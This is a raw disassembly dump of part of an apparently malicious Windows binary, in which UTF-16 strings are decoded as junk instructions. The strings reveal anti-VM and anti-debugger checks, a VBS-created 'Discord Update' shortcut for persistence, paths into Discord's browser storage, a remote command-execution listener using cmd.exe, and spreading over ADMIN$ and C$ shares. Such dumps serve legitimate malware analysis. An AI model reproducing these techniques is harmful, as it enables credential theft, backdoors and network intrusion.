  406f0b:	00 79 00             	add    %bh,0x0(%ecx)
  406f0e:	73 00                	jae    0x406f10
  406f10:	74 00                	je     0x406f12
  406f12:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406f16:	00 19                	add    %bl,(%ecx)
  406f18:	4d                   	dec    %ebp
  406f19:	00 61 00             	add    %ah,0x0(%ecx)
  406f1c:	6e                   	outsb  %ds:(%esi),(%dx)
  406f1d:	00 75 00             	add    %dh,0x0(%ebp)
  406f20:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406f24:	63 00                	arpl   %eax,(%eax)
  406f26:	74 00                	je     0x406f28
  406f28:	75 00                	jne    0x406f2a
  406f2a:	72 00                	jb     0x406f2c
  406f2c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406f30:	00 01                	add    %al,(%ecx)
  406f32:	00 0b                	add    %cl,(%ebx)
  406f34:	4d                   	dec    %ebp
  406f35:	00 6f 00             	add    %ch,0x0(%edi)
  406f38:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406f3c:	6c                   	insb   (%dx),%es:(%edi)
  406f3d:	00 00                	add    %al,(%eax)
  406f3f:	2b 6d 00             	sub    0x0(%ebp),%ebp
  406f42:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  406f48:	6f                   	outsl  %ds:(%esi),(%dx)
  406f49:	00 73 00             	add    %dh,0x0(%ebx)
  406f4c:	6f                   	outsl  %ds:(%esi),(%dx)
  406f4d:	00 66 00             	add    %ah,0x0(%esi)
  406f50:	74 00                	je     0x406f52
  406f52:	20 00                	and    %al,(%eax)
  406f54:	63 00                	arpl   %eax,(%eax)
  406f56:	6f                   	outsl  %ds:(%esi),(%dx)
  406f57:	00 72 00             	add    %dh,0x0(%edx)
  406f5a:	70 00                	jo     0x406f5c
  406f5c:	6f                   	outsl  %ds:(%esi),(%dx)
  406f5d:	00 72 00             	add    %dh,0x0(%edx)
  406f60:	61                   	popa
  406f61:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  406f65:	00 6f 00             	add    %ch,0x0(%edi)
  406f68:	6e                   	outsb  %ds:(%esi),(%dx)
  406f69:	00 00                	add    %al,(%eax)
  406f6b:	0f 76 00             	pcmpeqd (%eax),%mm0
  406f6e:	69 00 72 00 74 00    	imul   $0x740072,(%eax),%eax
  406f74:	75 00                	jne    0x406f76
  406f76:	61                   	popa
  406f77:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  406f7b:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  406f80:	77 00                	ja     0x406f82
  406f82:	61                   	popa
  406f83:	00 72 00             	add    %dh,0x0(%edx)
  406f86:	65 00 00             	add    %al,%gs:(%eax)
  406f89:	15 76 00 69 00       	adc    $0x690076,%eax
  406f8e:	72 00                	jb     0x406f90
  406f90:	74 00                	je     0x406f92
  406f92:	75 00                	jne    0x406f94
  406f94:	61                   	popa
  406f95:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  406f99:	00 6f 00             	add    %ch,0x0(%edi)
  406f9c:	78 00                	js     0x406f9e
  406f9e:	00 09                	add    %cl,(%ecx)
  406fa0:	71 00                	jno    0x406fa2
  406fa2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  406fa6:	75 00                	jne    0x406fa8
  406fa8:	00 07                	add    %al,(%edi)
  406faa:	78 00                	js     0x406fac
  406fac:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406fb0:	00 80 87 53 00 59    	add    %al,0x59005387(%eax)
  406fb6:	00 53 00             	add    %dl,0x0(%ebx)
  406fb9:	54                   	push   %esp
  406fba:	00 45 00             	add    %al,0x0(%ebp)
  406fbd:	4d                   	dec    %ebp
  406fbe:	00 5c 00 43          	add    %bl,0x43(%eax,%eax,1)
  406fc2:	00 75 00             	add    %dh,0x0(%ebp)
  406fc5:	72 00                	jb     0x406fc7
  406fc7:	72 00                	jb     0x406fc9
  406fc9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  406fcd:	74 00                	je     0x406fcf
  406fcf:	43                   	inc    %ebx
  406fd0:	00 6f 00             	add    %ch,0x0(%edi)
  406fd3:	6e                   	outsb  %ds:(%esi),(%dx)
  406fd4:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  406fd8:	00 6f 00             	add    %ch,0x0(%edi)
  406fdb:	6c                   	insb   (%dx),%es:(%edi)
  406fdc:	00 53 00             	add    %dl,0x0(%ebx)
  406fdf:	65 00 74 00 5c       	add    %dh,%gs:0x5c(%eax,%eax,1)
  406fe4:	00 43 00             	add    %al,0x0(%ebx)
  406fe7:	6f                   	outsl  %ds:(%esi),(%dx)
  406fe8:	00 6e 00             	add    %ch,0x0(%esi)
  406feb:	74 00                	je     0x406fed
  406fed:	72 00                	jb     0x406fef
  406fef:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff0:	00 6c 00 5c          	add    %ch,0x5c(%eax,%eax,1)
  406ff4:	00 53 00             	add    %dl,0x0(%ebx)
  406ff7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406ffb:	73 00                	jae    0x406ffd
  406ffd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407003:	20 00                	and    %al,(%eax)
  407005:	4d                   	dec    %ebp
  407006:	00 61 00             	add    %ah,0x0(%ecx)
  407009:	6e                   	outsb  %ds:(%esi),(%dx)
  40700a:	00 61 00             	add    %ah,0x0(%ecx)
  40700d:	67 00 65 00          	add    %ah,0x0(%di)
  407011:	72 00                	jb     0x407013
  407013:	5c                   	pop    %esp
  407014:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  407018:	00 62 00             	add    %ah,0x0(%edx)
  40701b:	75 00                	jne    0x40701d
  40701d:	67 00 20             	add    %ah,(%bx,%si)
  407020:	00 50 00             	add    %dl,0x0(%eax)
  407023:	72 00                	jb     0x407025
  407025:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  40702b:	20 00                	and    %al,(%eax)
  40702d:	46                   	inc    %esi
  40702e:	00 69 00             	add    %ch,0x0(%ecx)
  407031:	6c                   	insb   (%dx),%es:(%edi)
  407032:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  407036:	00 72 00             	add    %dh,0x0(%edx)
  407039:	00 0f                	add    %cl,(%edi)
  40703b:	44                   	inc    %esp
  40703c:	00 65 00             	add    %ah,0x0(%ebp)
  40703f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  407043:	75 00                	jne    0x407045
  407045:	6c                   	insb   (%dx),%es:(%edi)
  407046:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40704a:	0f 6f 00             	movq   (%eax),%mm0
  40704d:	6c                   	insb   (%dx),%es:(%edi)
  40704e:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  407052:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  407056:	00 67 00             	add    %ah,0x0(%edi)
  407059:	00 0b                	add    %cl,(%ebx)
  40705b:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  407061:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  407065:	00 07                	add    %al,(%edi)
  407067:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  40706d:	00 09                	add    %cl,(%ecx)
  40706f:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  407075:	67 00 00             	add    %al,(%bx,%si)
  407078:	09 69 00             	or     %ebp,0x0(%ecx)
  40707b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40707f:	77 00                	ja     0x407081
  407081:	00 0d 69 00 64 00    	add    %cl,0x640069
  407087:	61                   	popa
  407088:	00 77 00             	add    %dh,0x0(%edi)
  40708b:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40708f:	00 09                	add    %cl,(%ecx)
  407091:	69 00 64 00 61 00    	imul   $0x610064,(%eax),%eax
  407097:	71 00                	jno    0x407099
  407099:	00 0d 69 00 64 00    	add    %cl,0x640069
  40709f:	61                   	popa
  4070a0:	00 71 00             	add    %dh,0x0(%ecx)
  4070a3:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  4070a7:	00 13                	add    %dl,(%ebx)
  4070a9:	77 00                	ja     0x4070ab
  4070ab:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  4070b1:	73 00                	jae    0x4070b3
  4070b3:	68 00 61 00 72       	push   $0x72006100
  4070b8:	00 6b 00             	add    %ch,0x0(%ebx)
  4070bb:	00 0f                	add    %cl,(%edi)
  4070bd:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  4070c1:	64 00 64 00 6c       	add    %ah,%fs:0x6c(%eax,%eax,1)
  4070c6:	00 65 00             	add    %ah,0x0(%ebp)
  4070c9:	72 00                	jb     0x4070cb
  4070cb:	00 0d 78 00 36 00    	add    %cl,0x360078
  4070d1:	34 00                	xor    $0x0,%al
  4070d3:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  4070d7:	67 00 00             	add    %al,(%bx,%si)
  4070da:	0d 78 00 33 00       	or     $0x330078,%eax
  4070df:	32 00                	xor    (%eax),%al
  4070e1:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  4070e5:	67 00 00             	add    %al,(%bx,%si)
  4070e8:	11 64 00 65          	adc    %esp,0x65(%eax,%eax,1)
  4070ec:	00 62 00             	add    %ah,0x0(%edx)
  4070ef:	75 00                	jne    0x4070f1
  4070f1:	67 00 67 00          	add    %ah,0x0(%bx)
  4070f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4070f9:	00 0f                	add    %cl,(%edi)
  4070fb:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  4070ff:	67 00 76 00          	add    %dh,0x0(%bp)
  407103:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  407109:	00 1b                	add    %bl,(%ebx)
  40710b:	70 00                	jo     0x40710d
  40710d:	72 00                	jb     0x40710f
  40710f:	6f                   	outsl  %ds:(%esi),(%dx)
  407110:	00 63 00             	add    %ah,0x0(%ebx)
  407113:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407117:	73 00                	jae    0x407119
  407119:	68 00 61 00 63       	push   $0x63006100
  40711e:	00 6b 00             	add    %ch,0x0(%ebx)
  407121:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407125:	00 0f                	add    %cl,(%edi)
  407127:	44                   	inc    %esp
  407128:	00 69 00             	add    %ch,0x0(%ecx)
  40712b:	73 00                	jae    0x40712d
  40712d:	63 00                	arpl   %eax,(%eax)
  40712f:	6f                   	outsl  %ds:(%esi),(%dx)
  407130:	00 72 00             	add    %dh,0x0(%edx)
  407133:	64 00 00             	add    %al,%fs:(%eax)
  407136:	25 64 00 69 00       	and    $0x690064,%eax
  40713b:	73 00                	jae    0x40713d
  40713d:	63 00                	arpl   %eax,(%eax)
  40713f:	6f                   	outsl  %ds:(%esi),(%dx)
  407140:	00 72 00             	add    %dh,0x0(%edx)
  407143:	64 00 5f 00          	add    %bl,%fs:0x0(%edi)
  407147:	75 00                	jne    0x407149
  407149:	70 00                	jo     0x40714b
  40714b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40714f:	74 00                	je     0x407151
  407151:	65 00 2e             	add    %ch,%gs:(%esi)
  407154:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  407158:	00 6b 00             	add    %ch,0x0(%ebx)
  40715b:	00 80 a7 0d 00 0a    	add    %al,0xa000da7(%eax)
  407161:	00 53 00             	add    %dl,0x0(%ebx)
  407164:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  407169:	00 6f 00             	add    %ch,0x0(%edi)
  40716c:	57                   	push   %edi
  40716d:	00 53 00             	add    %dl,0x0(%ebx)
  407170:	20 00                	and    %al,(%eax)
  407172:	3d 00 20 00 57       	cmp    $0x57002000,%eax
  407177:	00 53 00             	add    %dl,0x0(%ebx)
  40717a:	63 00                	arpl   %eax,(%eax)
  40717c:	72 00                	jb     0x40717e
  40717e:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407184:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  407188:	72 00                	jb     0x40718a
  40718a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40718e:	74 00                	je     0x407190
  407190:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  407194:	62 00                	bound  %eax,(%eax)
  407196:	6a 00                	push   $0x0
  407198:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40719c:	74 00                	je     0x40719e
  40719e:	28 00                	sub    %al,(%eax)
  4071a0:	22 00                	and    (%eax),%al
  4071a2:	57                   	push   %edi
  4071a3:	00 53 00             	add    %dl,0x0(%ebx)
  4071a6:	63 00                	arpl   %eax,(%eax)
  4071a8:	72 00                	jb     0x4071aa
  4071aa:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4071b0:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4071b4:	68 00 65 00 6c       	push   $0x6c006500
  4071b9:	00 6c 00 22          	add    %ch,0x22(%eax,%eax,1)
  4071bd:	00 29                	add    %ch,(%ecx)
  4071bf:	00 0d 00 0a 00 53    	add    %cl,0x53000a00
  4071c5:	00 65 00             	add    %ah,0x0(%ebp)
  4071c8:	74 00                	je     0x4071ca
  4071ca:	20 00                	and    %al,(%eax)
  4071cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4071cd:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4071d1:	00 6e 00             	add    %ch,0x0(%esi)
  4071d4:	6b 00 20             	imul   $0x20,(%eax),%eax
  4071d7:	00 3d 00 20 00 6f    	add    %bh,0x6f002000
  4071dd:	00 57 00             	add    %dl,0x0(%edi)
  4071e0:	53                   	push   %ebx
  4071e1:	00 2e                	add    %ch,(%esi)
  4071e3:	00 43 00             	add    %al,0x0(%ebx)
  4071e6:	72 00                	jb     0x4071e8
  4071e8:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4071ec:	74 00                	je     0x4071ee
  4071ee:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  4071f2:	68 00 6f 00 72       	push   $0x72006f00
  4071f7:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  4071fb:	00 75 00             	add    %dh,0x0(%ebp)
  4071fe:	74 00                	je     0x407200
  407200:	28 00                	sub    %al,(%eax)
  407202:	22 00                	and    (%eax),%al
  407204:	00 31                	add    %dh,(%ecx)
  407206:	22 00                	and    (%eax),%al
  407208:	29 00                	sub    %eax,(%eax)
  40720a:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  40720f:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  407213:	00 6e 00             	add    %ch,0x0(%esi)
  407216:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  407219:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40721d:	00 72 00             	add    %dh,0x0(%edx)
  407220:	67 00 65 00          	add    %ah,0x0(%di)
  407224:	74 00                	je     0x407226
  407226:	50                   	push   %eax
  407227:	00 61 00             	add    %ah,0x0(%ecx)
  40722a:	74 00                	je     0x40722c
  40722c:	68 00 20 00 3d       	push   $0x3d002000
  407231:	00 20                	add    %ah,(%eax)
  407233:	00 22                	add    %ah,(%edx)
  407235:	00 00                	add    %al,(%eax)
  407237:	3b 22                	cmp    (%edx),%esp
  407239:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40723f:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  407243:	00 6e 00             	add    %ch,0x0(%esi)
  407246:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  407249:	00 57 00             	add    %dl,0x0(%edi)
  40724c:	6f                   	outsl  %ds:(%esi),(%dx)
  40724d:	00 72 00             	add    %dh,0x0(%edx)
  407250:	6b 00 69             	imul   $0x69,(%eax),%eax
  407253:	00 6e 00             	add    %ch,0x0(%esi)
  407256:	67 00 44 00          	add    %al,0x0(%si)
  40725a:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  407260:	63 00                	arpl   %eax,(%eax)
  407262:	74 00                	je     0x407264
  407264:	6f                   	outsl  %ds:(%esi),(%dx)
  407265:	00 72 00             	add    %dh,0x0(%edx)
  407268:	79 00                	jns    0x40726a
  40726a:	20 00                	and    %al,(%eax)
  40726c:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  407271:	00 00                	add    %al,(%eax)
  407273:	80 99 22 00 0d 00 0a 	sbbb   $0xa,0xd0022(%ecx)
  40727a:	00 6f 00             	add    %ch,0x0(%edi)
  40727d:	4c                   	dec    %esp
  40727e:	00 69 00             	add    %ch,0x0(%ecx)
  407281:	6e                   	outsb  %ds:(%esi),(%dx)
  407282:	00 6b 00             	add    %ch,0x0(%ebx)
  407285:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  407289:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40728f:	6f                   	outsl  %ds:(%esi),(%dx)
  407290:	00 77 00             	add    %dh,0x0(%edi)
  407293:	53                   	push   %ebx
  407294:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  407298:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40729c:	00 20                	add    %ah,(%eax)
  40729e:	00 3d 00 20 00 31    	add    %bh,0x31002000
  4072a4:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  4072aa:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4072ae:	00 6e 00             	add    %ch,0x0(%esi)
  4072b1:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  4072b4:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  4072b8:	00 73 00             	add    %dh,0x0(%ebx)
  4072bb:	63 00                	arpl   %eax,(%eax)
  4072bd:	72 00                	jb     0x4072bf
  4072bf:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4072c5:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4072cb:	20 00                	and    %al,(%eax)
  4072cd:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  4072d2:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  4072d6:	00 73 00             	add    %dh,0x0(%ebx)
  4072d9:	63 00                	arpl   %eax,(%eax)
  4072db:	6f                   	outsl  %ds:(%esi),(%dx)
  4072dc:	00 72 00             	add    %dh,0x0(%edx)
  4072df:	64 00 20             	add    %ah,%fs:(%eax)
  4072e2:	00 55 00             	add    %dl,0x0(%ebp)
  4072e5:	70 00                	jo     0x4072e7
  4072e7:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4072eb:	74 00                	je     0x4072ed
  4072ed:	65 00 22             	add    %ah,%gs:(%edx)
  4072f0:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  4072f6:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4072fa:	00 6e 00             	add    %ch,0x0(%esi)
  4072fd:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  407300:	00 53 00             	add    %dl,0x0(%ebx)
  407303:	61                   	popa
  407304:	00 76 00             	add    %dh,0x0(%esi)
  407307:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40730e:	0b 74 00 65          	or     0x65(%eax,%eax,1),%esi
  407312:	00 6d 00             	add    %ch,0x0(%ebp)
  407315:	70 00                	jo     0x407317
  407317:	5f                   	pop    %edi
  407318:	00 00                	add    %al,(%eax)
  40731a:	03 4e 00             	add    0x0(%esi),%ecx
  40731d:	00 09                	add    %cl,(%ecx)
  40731f:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  407323:	62 00                	bound  %eax,(%eax)
  407325:	73 00                	jae    0x407327
  407327:	00 0f                	add    %cl,(%edi)
  407329:	77 00                	ja     0x40732b
  40732b:	73 00                	jae    0x40732d
  40732d:	63 00                	arpl   %eax,(%eax)
  40732f:	72 00                	jb     0x407331
  407331:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  407337:	00 03                	add    %al,(%ebx)
  407339:	22 00                	and    (%eax),%al
  40733b:	00 0b                	add    %cl,(%ebx)
  40733d:	43                   	inc    %ebx
  40733e:	00 61 00             	add    %ah,0x0(%ecx)
  407341:	63 00                	arpl   %eax,(%eax)
  407343:	68 00 65 00 00       	push   $0x6500
  407348:	1b 43 00             	sbb    0x0(%ebx),%eax
  40734b:	6f                   	outsl  %ds:(%esi),(%dx)
  40734c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407350:	00 20                	add    %ah,(%eax)
  407352:	00 43 00             	add    %al,0x0(%ebx)
  407355:	61                   	popa
  407356:	00 63 00             	add    %ah,0x0(%ebx)
  407359:	68 00 65 00 5c       	push   $0x5c006500
  40735e:	00 6a 00             	add    %ch,0x0(%edx)
  407361:	73 00                	jae    0x407363
  407363:	00 13                	add    %dl,(%ebx)
  407365:	49                   	dec    %ecx
  407366:	00 6e 00             	add    %ch,0x0(%esi)
  407369:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40736d:	78 00                	js     0x40736f
  40736f:	65 00 64 00 44       	add    %ah,%gs:0x44(%eax,%eax,1)
  407374:	00 42 00             	add    %al,0x0(%edx)
  407377:	00 1b                	add    %bl,(%ebx)
  407379:	4c                   	dec    %esp
  40737a:	00 6f 00             	add    %ch,0x0(%edi)
  40737d:	63 00                	arpl   %eax,(%eax)
  40737f:	61                   	popa
  407380:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  407384:	00 53 00             	add    %dl,0x0(%ebx)
  407387:	74 00                	je     0x407389
  407389:	6f                   	outsl  %ds:(%esi),(%dx)
  40738a:	00 72 00             	add    %dh,0x0(%edx)
  40738d:	61                   	popa
  40738e:	00 67 00             	add    %ah,0x0(%edi)
  407391:	65 00 00             	add    %al,%gs:(%eax)
  407394:	3f                   	aas
  407395:	5b                   	pop    %ebx
  407396:	00 52 00             	add    %dl,0x0(%edx)
  407399:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40739d:	6f                   	outsl  %ds:(%esi),(%dx)
  40739e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4073a2:	00 45 00             	add    %al,0x0(%ebp)
  4073a5:	78 00                	js     0x4073a7
  4073a7:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4073ab:	5d                   	pop    %ebp
  4073ac:	00 20                	add    %ah,(%eax)
  4073ae:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4073b2:	00 73 00             	add    %dh,0x0(%ebx)
  4073b5:	74 00                	je     0x4073b7
  4073b7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4073bb:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4073c1:	20 00                	and    %al,(%eax)
  4073c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4073c4:	00 6e 00             	add    %ch,0x0(%esi)
  4073c7:	20 00                	and    %al,(%eax)
  4073c9:	70 00                	jo     0x4073cb
  4073cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4073cc:	00 72 00             	add    %dh,0x0(%edx)
  4073cf:	74 00                	je     0x4073d1
  4073d1:	20 00                	and    %al,(%eax)
  4073d3:	00 07                	add    %al,(%edi)
  4073d5:	2e 00 2e             	add    %ch,%cs:(%esi)
  4073d8:	00 2e                	add    %ch,(%esi)
  4073da:	00 00                	add    %al,(%eax)
  4073dc:	3f                   	aas
  4073dd:	5b                   	pop    %ebx
  4073de:	00 52 00             	add    %dl,0x0(%edx)
  4073e1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4073e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4073ea:	00 45 00             	add    %al,0x0(%ebp)
  4073ed:	78 00                	js     0x4073ef
  4073ef:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4073f3:	5d                   	pop    %ebp
  4073f4:	00 20                	add    %ah,(%eax)
  4073f6:	00 43 00             	add    %al,0x0(%ebx)
  4073f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4073fa:	00 6d 00             	add    %ch,0x0(%ebp)
  4073fd:	6d                   	insl   (%dx),%es:(%edi)
  4073fe:	00 61 00             	add    %ah,0x0(%ecx)
  407401:	6e                   	outsb  %ds:(%esi),(%dx)
  407402:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  407406:	00 72 00             	add    %dh,0x0(%edx)
  407409:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40740d:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  407411:	76 00                	jbe    0x407413
  407413:	65 00 64 00 3a       	add    %ah,%gs:0x3a(%eax,%eax,1)
  407418:	00 20                	add    %ah,(%eax)
  40741a:	00 00                	add    %al,(%eax)
  40741c:	3b 5b 00             	cmp    0x0(%ebx),%ebx
  40741f:	52                   	push   %edx
  407420:	00 65 00             	add    %ah,0x0(%ebp)
  407423:	6d                   	insl   (%dx),%es:(%edi)
  407424:	00 6f 00             	add    %ch,0x0(%edi)
  407427:	74 00                	je     0x407429
  407429:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40742d:	78 00                	js     0x40742f
  40742f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407433:	5d                   	pop    %ebp
  407434:	00 20                	add    %ah,(%eax)
  407436:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40743a:	00 73 00             	add    %dh,0x0(%ebx)
  40743d:	74 00                	je     0x40743f
  40743f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  407443:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407447:	20 00                	and    %al,(%eax)
  407449:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40744d:	72 00                	jb     0x40744f
  40744f:	6f                   	outsl  %ds:(%esi),(%dx)
  407450:	00 72 00             	add    %dh,0x0(%edx)
  407453:	3a 00                	cmp    (%eax),%al
  407455:	20 00                	and    %al,(%eax)
  407457:	00 0f                	add    %cl,(%edi)
  407459:	63 00                	arpl   %eax,(%eax)
  40745b:	6d                   	insl   (%dx),%es:(%edi)
  40745c:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  407460:	00 65 00             	add    %ah,0x0(%ebp)
  407463:	78 00                	js     0x407465
  407465:	65 00 00             	add    %al,%gs:(%eax)
  407468:	07                   	pop    %es
  407469:	2f                   	das
  40746a:	00 63 00             	add    %ah,0x0(%ebx)
  40746d:	20 00                	and    %al,(%eax)
  40746f:	00 33                	add    %dh,(%ebx)
  407471:	45                   	inc    %ebp
  407472:	00 72 00             	add    %dh,0x0(%edx)
  407475:	72 00                	jb     0x407477
  407477:	6f                   	outsl  %ds:(%esi),(%dx)
  407478:	00 72 00             	add    %dh,0x0(%edx)
  40747b:	20 00                	and    %al,(%eax)
  40747d:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  407481:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407485:	75 00                	jne    0x407487
  407487:	74 00                	je     0x407489
  407489:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40748f:	20 00                	and    %al,(%eax)
  407491:	63 00                	arpl   %eax,(%eax)
  407493:	6f                   	outsl  %ds:(%esi),(%dx)
  407494:	00 6d 00             	add    %ch,0x0(%ebp)
  407497:	6d                   	insl   (%dx),%es:(%edi)
  407498:	00 61 00             	add    %ah,0x0(%ecx)
  40749b:	6e                   	outsb  %ds:(%esi),(%dx)
  40749c:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  4074a0:	00 20                	add    %ah,(%eax)
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	17                   	pop    %ss
  4074a5:	7b 00                	jnp    0x4074a7
  4074a7:	30 00                	xor    %al,(%eax)
  4074a9:	7d 00                	jge    0x4074ab
  4074ab:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  4074af:	31 00                	xor    %eax,(%eax)
  4074b1:	7d 00                	jge    0x4074b3
  4074b3:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  4074b7:	32 00                	xor    (%eax),%al
  4074b9:	7d 00                	jge    0x4074bb
  4074bb:	00 35 5b 00 4c 00    	add    %dh,0x4c005b
  4074c1:	61                   	popa
  4074c2:	00 6e 00             	add    %ch,0x0(%esi)
  4074c5:	53                   	push   %ebx
  4074c6:	00 70 00             	add    %dh,0x0(%eax)
  4074c9:	72 00                	jb     0x4074cb
  4074cb:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4074cf:	64 00 5d 00          	add    %bl,%fs:0x0(%ebp)
  4074d3:	20 00                	and    %al,(%eax)
  4074d5:	53                   	push   %ebx
  4074d6:	00 75 00             	add    %dh,0x0(%ebp)
  4074d9:	62 00                	bound  %eax,(%eax)
  4074db:	6e                   	outsb  %ds:(%esi),(%dx)
  4074dc:	00 65 00             	add    %ah,0x0(%ebp)
  4074df:	74 00                	je     0x4074e1
  4074e1:	20 00                	and    %al,(%eax)
  4074e3:	45                   	inc    %ebp
  4074e4:	00 72 00             	add    %dh,0x0(%edx)
  4074e7:	72 00                	jb     0x4074e9
  4074e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4074ea:	00 72 00             	add    %dh,0x0(%edx)
  4074ed:	3a 00                	cmp    (%eax),%al
  4074ef:	20 00                	and    %al,(%eax)
  4074f1:	00 05 43 00 24 00    	add    %al,0x240043
  4074f7:	00 0d 41 00 44 00    	add    %cl,0x440041
  4074fd:	4d                   	dec    %ebp
  4074fe:	00 49 00             	add    %cl,0x0(%ecx)
  407501:	4e                   	dec    %esi
  407502:	00 24 00             	add    %ah,(%eax,%eax,1)
